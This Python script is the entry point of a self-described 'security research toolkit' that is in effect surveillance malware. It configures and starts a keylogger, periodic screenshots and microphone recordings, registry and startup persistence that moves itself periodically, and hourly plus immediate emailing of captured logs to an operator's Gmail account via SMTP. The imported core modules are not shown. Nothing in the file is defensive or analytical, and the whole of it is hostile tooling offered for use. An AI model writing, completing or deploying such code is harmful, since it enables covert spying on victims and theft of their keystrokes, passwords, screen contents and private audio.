#!/usr/bin/env python3
"""
Main entry point for the security research toolkit.
This script orchestrates surveillance, persistence, and data exfiltration.
"""
import os
import sys
import time
import threading
from datetime import datetime

# Import core modules
from core.surveillance import SurveillanceEngine
from core.persistence import PersistenceManager
from core.communication import DataExfiltrator
from core.crypto_utils import obfuscate_string, deobfuscate_string

# ============================================================================
# CONFIGURATION - MODIFY THESE VALUES BEFORE RUNNING
# ============================================================================

# Email configuration for data exfiltration
EMAIL_CONFIG = {
    'email': 'your_email@gmail.com',  # Replace with your email
    'password': 'your_app_password',  # Replace with your app password
    'smtp_server': 'smtp.gmail.com',  # Gmail SMTP server
    'smtp_port': 587,                 # TLS port
    'use_tls': True
}

# Surveillance settings
SURVEILLANCE_CONFIG = {
    'log_file': 'activity.log',
    'screenshot_interval': 300,  # 5 minutes
    'audio_interval': 900,       # 15 minutes
    'audio_duration': 10         # 10 seconds
}

# Persistence settings
PERSISTENCE_CONFIG = {
    'move_interval': 600,        # 10 minutes
    'enable_registry': True,
    'enable_startup': True
}

# Exfiltration settings
EXFILTRATION_CONFIG = {
    'report_interval': 3600,     # 1 hour
    'enable_immediate': True
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def setup_logging():
    """Setup logging with timestamp."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"activity_{timestamp}.log"
    return log_file

def validate_config():
    """Validate configuration before starting."""
    if EMAIL_CONFIG['email'] == 'your_email@gmail.com':
        print("ERROR: Please configure your email settings in main.py")
        print("Update EMAIL_CONFIG with your actual email and password")
        return False
    
    if EMAIL_CONFIG['password'] == 'your_app_password':
        print("ERROR: Please configure your email password in main.py")
        print("Use an app password for Gmail (not your regular password)")
        return False
    
    return True

def start_surveillance(surv_engine, log_file):
    """Start surveillance activities."""
    print(f"Starting surveillance with log file: {log_file}")
    
    # Start keylogger
    surv_engine.start_keylogger(log_file=log_file)
    
    # Start periodic screenshots
    surv_engine.start_periodic_screenshots(
        interval=SURVEILLANCE_CONFIG['screenshot_interval']
    )
    
    # Start periodic audio recording
    surv_engine.start_periodic_audio(
        interval=SURVEILLANCE_CONFIG['audio_interval'],
        duration=SURVEILLANCE_CONFIG['audio_duration']
    )
    
    print("Surveillance started successfully")

def start_persistence():
    """Start persistence mechanisms."""
    print("Establishing persistence...")
    
    persist_manager = PersistenceManager()
    
    # Establish persistence
    success = persist_manager.establish_persistence()
    if success:
        print("Persistence established successfully")
    else:
        print("Warning: Some persistence mechanisms failed")
    
    # Start periodic movement
    persist_manager.start_periodic_movement(
        interval=PERSISTENCE_CONFIG['move_interval']
    )
    
    return persist_manager

def start_exfiltration(log_file):
    """Start data exfiltration."""
    print("Starting data exfiltration...")
    
    exfil = DataExfiltrator(EMAIL_CONFIG)
    
    # Start periodic reporting
    exfil.start_periodic_exfiltration(
        log_file=log_file,
        interval=EXFILTRATION_CONFIG['report_interval']
    )
    
    # Send immediate report if enabled
    if EXFILTRATION_CONFIG['enable_immediate']:
        threading.Timer(30, exfil.send_immediate_report, args=[log_file]).start()
    
    return exfil

def main():
    """Main execution function."""
    print("=" * 50)
    print("Security Research Toolkit")
    print("=" * 50)
    
    # Validate configuration
    if not validate_config():
        sys.exit(1)
    
    try:
        # Setup logging
        log_file = setup_logging()
        
        # Start persistence first
        persist_manager = start_persistence()
        
        # Start surveillance
        surv_engine = SurveillanceEngine()
        start_surveillance(surv_engine, log_file)
        
        # Start exfiltration
        exfil = start_exfiltration(log_file)
        
        print("\n" + "=" * 50)
        print("All systems operational")
        print("Press Ctrl+C to stop")
        print("=" * 50)
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nShutting down...")
            
            # Cleanup
            surv_engine.stop_keylogger()
            exfil.stop_exfiltration()
            
            print("Shutdown complete")
    
    except Exception as e:
        print(f"Error during execution: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 